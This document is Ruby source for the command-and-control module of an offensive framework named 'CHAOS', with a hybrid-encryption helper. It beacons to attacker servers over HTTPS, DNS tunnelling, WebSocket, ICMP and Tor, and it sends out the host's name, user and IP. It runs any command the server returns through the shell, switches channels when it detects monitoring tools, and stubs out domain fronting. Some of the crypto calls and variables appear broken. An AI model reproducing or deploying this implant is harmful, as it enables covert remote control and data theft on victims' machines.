  # ===== Enhanced C2 Communication Module =====
  class C2Communicator
    PROTOCOLS = ['https', 'dns', 'websocket', 'icmp', 'tor'].freeze
    CDN_PROVIDERS = ['cloudflare', 'akamai', 'fastly'].freeze

    def initialize(framework, opts = {})
      @framework = framework
      @encryption = HybridEncryption.new
      @session_id = Digest::SHA256.hexdigest(SecureRandom.random_bytes(32))
      @c2_servers = opts[:c2_servers] || []
      @user_agent = opts[:user_agent] || 'CHAOS Framework'
      @running = true
      @current_protocol = nil
    end

    def connect
      @current_protocol = select_optimal_protocol
      case @current_protocol
      when 'https'
        https_connect
      when 'dns'
        dns_connect
      when 'websocket'
        websocket_connect
      when 'icmp'
        icmp_connect
      when 'tor'
        tor_connect
      else
        fallback_routing
      end
    end

    def beacon_loop
      while @running
        connect
        sleep_time = 60 + rand(-10..10) # Jitter
        sleep(sleep_time)
      end
    end

    def stop
      @running = false
    end

    private

    def select_optimal_protocol
      # Prioritize Tor if available
      return 'tor' if tor_available?
      # Use ICMP if allowed
      return 'icmp' if icmp_allowed?
      # Use DNS if network monitoring detected
      return 'dns' if network_monitoring?
      # Default to HTTPS
      'https'
    end

    def tor_available?
      # Check if Tor is installed and running
      if RUBY_PLATFORM =~ /linux|darwin/
        `which tor && systemctl is-active --quiet tor`
        $?.success?
      else
        false
      end
    end

    def icmp_allowed?
      # Check if ICMP is allowed
      `ping -c 1 8.8.8.8`
      $?.success?
    end

    def network_monitoring?
      # Simple check for known monitoring tools
      if RUBY_PLATFORM =~ /linux|darwin/
        `ps aux | grep -E "wireshark|tcpdump|snort|bro" | grep -v grep`
        $?.success?
      else
        `tasklist | findstr /i "wireshark tcpdump snort bro"`
        $?.success?
      end
    end

    def https_connect
      server = @c2_servers.select { |s| s.start_with?('http') }.sample
      return false unless server
      
      uri = URI.parse(server)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true if uri.scheme == 'https'
      http.read_timeout = 30
      
      headers = {
        'User-Agent' => @user_agent,
        'X-Session-ID' => @session_id,
        'Authorization' => "Bearer #{SecureRandom.hex(16)}"
      }
      
      payload = {
        status: 'checkin',
        system: get_system_info
      }
      
      encrypted_payload = @encryption.encrypt_hybrid(payload)
      
      request = Net::HTTP::Post.new(uri.request_uri, headers)
      request.body = encrypted_payload
      
      response = http.request(request)
      if response.code == '200'
        decrypted = @encryption.decrypt_hybrid(response.body)
        process_commands(JSON.parse(decrypted))
        true
      else
        false
      end
    rescue => e
      @framework.print_error("HTTPS C2 failed: #{e.message}")
      false
    end

    def dns_connect
      domain = @c2_servers.find { |s| s.start_with?('dns:') }&.split('//')&.last
      return false unless domain
      
      resolver = Resolv::DNS.new
      subdomain = Base64.strict_encode64(@session_id)[0..30].tr('=', '')
      query = "#{subdomain}.#{domain}"
      
      begin
        resolver.getresource(query, Resolv::DNS::Resource::IN::TXT).strings.each do |txt|
          decrypted = @encryption.decrypt_hybrid(txt)
          command = JSON.parse(decrypted)
          result = execute_command(command['cmd'])
          response_sub = Base64.strict_encode64(result)[0..30].tr('=', '')
          resolver.getresource("#{response_sub}.#{domain}", Resolv::DNS::Resource::IN::A)
        end
        true
      rescue
        false
      end
    end

    def websocket_connect
      # Requires additional gem: websocket-driver
      server = @c2_servers.find { |s| s.start_with?('ws') }
      return false unless server
      
      require 'websocket/driver'
      socket = TCPSocket.new(URI.parse(server).host, URI.parse(server).port || 80)
      driver = WebSocket::Driver.client(socket)
      
      driver.on(:open) do
        driver.text(@encryption.encrypt_hybrid({
          action: 'register',
          session_id: @session_id,
          system: get_system_info
        }))
      end
      
      driver.on(:message) do |event|
        decrypted = @encryption.decrypt_hybrid(event.data)
        command = JSON.parse(decrypted)
        if command['action'] == 'execute'
          result = execute_command(command['command'])
          driver.text(@encryption.encrypt_hybrid({result: result}))
        end
      end
      
      driver.start
      sleep(60) while @running
      true
    rescue => e
      @framework.print_error("WebSocket C2 failed: #{e.message}")
      false
    end

    def icmp_connect
      payload = @encryption.encrypt_hybrid(@session_id)
      encoded_payload = Base64.strict_encode64(payload)[0..30] # Limit to 31 chars
      server = @c2_servers.select { |s| s.start_with?('icmp:') }.first.split('//').last

      while @running
        # Send beacon via ICMP
        if RUBY_PLATFORM =~ /linux|darwin/
          `ping -c 1 -p #{encoded_payload} #{server}`
        else
          `ping -n 1 -w 1000 #{server}`
        end
        sleep(rand(5..15))
      end
    end

    def tor_connect
      server = @c2_servers.select { |s| s.start_with?('tor:') }.first.split('//').last
      host, port = server.split(':')
      
      require 'socksify'
      require 'socksify/http'
      
      TCPSocket.socks_username = 'chaos'
      TCPSocket.socks_password = 'darknet'
      
      uri = URI.parse("http://#{host}:#{port || 80}/beacon")
      http = Net::HTTP.SOCKSProxy('127.0.0.1', 9050).new(uri.host, uri.port)
      
      request = Net::HTTP::Post.new(uri.request_uri)
      request.body = @encryption.encrypt_hybrid(get_system_info)
      response = http.request(request)
      
      if response.code == '200'
        decrypted = @encryption.decrypt_hybrid(response.body)
        process_commands(JSON.parse(decrypted))
        true
      else
        false
      end
    rescue => e
      @framework.print_error("Tor C2 failed: #{e.message}")
      false
    end

    def domain_fronting
      provider = CDN_PROVIDERS.sample
      headers = {
        'Host' => 'cdn-proxy.com',
        'X-Forwarded-Host' => @c2_domain,
        'User-Agent' => @user_agent
      }
      
      uri = URI.parse("https://#{provider}-edge.com")
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      request = Net::HTTP::Get.new(uri.path, headers)
      http.request(request)
    end

    def fallback_routing
      @c2_servers.shuffle.each do |server|
        protocol = server.split(':').first
        return true if case protocol
          when 'https' then https_connect
          when 'dns' then dns_connect
          when 'ws', 'wss' then websocket_connect
          when 'icmp' then icmp_connect
          when 'tor' then tor_connect
          else false
        end
        sleep(rand(1..5))
      end
      false
    end

    def get_system_info
      {
        hostname: Socket.gethostname,
        os: RUBY_PLATFORM,
        user: Etc.getlogin,
        ip: get_ip_address,
        process_count: `ps aux | wc -l`.to_i
      }
    end

    def get_ip_address
      Net::HTTP.get(URI.parse('https://api.ipify.org'))
    rescue
      Socket.ip_address_list.find do |ai| 
        ai.ipv4? && !ai.ipv4_loopback?
      end&.ip_address || 'unknown'
    end

    def process_commands(commands)
      return unless commands && commands['commands']
      
      commands['commands'].each do |cmd|
        result = execute_command(cmd)
        @framework.print_status("Executed command: #{cmd} => #{result}")
      end
    end

    def execute_command(cmd)
      `#{cmd} 2>&1`
    rescue => e
      e.message
    end
  end

  # ===== Advanced Encryption Module =====
  class HybridEncryption
    def initialize
      @aes_key = SecureRandom.random_bytes(32)
      generate_ecc_key
      @dh = generate_dh_key
    end

    def generate_ecc_key
      @ecc_key = OpenSSL::PKey::EC.generate('prime256v1')
    end

    def generate_dh_key
      OpenSSL::PKey::DH.new(2048).generate_key!
    end

    def encrypt_hybrid(data)
      return unless data
      data = data.to_json if data.is_a?(Hash)
      data = data.encode('utf-8') if data.is_a?(String)
      
      # Generate IV for AES
      iv = SecureRandom.random_bytes(16)
      cipher = OpenSSL::Cipher.new('AES-256-CBC')
      cipher.encrypt
      cipher.key = @aes_key
      cipher.iv = iv
      
      # Encrypt data with AES
      encrypted_data = cipher.update(data) + cipher.final
      
      # Encrypt AES key with ECC
      encrypted_key = @ecc_key.public_encrypt(@aes_key)
      
      # Combine components
      Base64.strict_encode64(iv + encrypted_key + encrypted_data)
    end

    def decrypt_hybrid(encrypted_data)
      return unless encrypted_data
      
      raw = Base64.strict_decode64(encrypted_data)
      iv = raw[0..15]
      encrypted_key = raw[16..271]
      encrypted_data = raw[272..-1]
      
      # Decrypt AES key with ECC
      aes_key = @ecc_key.private_decrypt(encrypted_key)
      
      # Decrypt data with AES
      cipher = OpenSSL::Cipher.new('AES-256-CBC')
      cipher.decrypt
      cipher.key = aes_key
      cipher.iv = iv
      plaintext = cipher.update(encrypted_data) + cipher.final
      plaintext.force_encoding('utf-8')
    rescue => e
      "Decryption error: #{e.message}"
    end

    def negotiate_session(peer_public_key)
      peer_key = OpenSSL::BN.new(peer_public_key, 2)
      shared_secret = @dh.compute_key(peer_key)
      
      # Derive keys using HKDF
      hkdf = OpenSSL::KDF.hkdf(
        shared_secret,
        salt: SecureRandom.random_bytes(16),
        info: 'CHAOS_SESSION',
        length: 64,
        hash: 'SHA512'
      )
      
      {
        encryption_key: hkdf[0..31],
        mac_key: hkdf[32..63]
      }
    end
  end

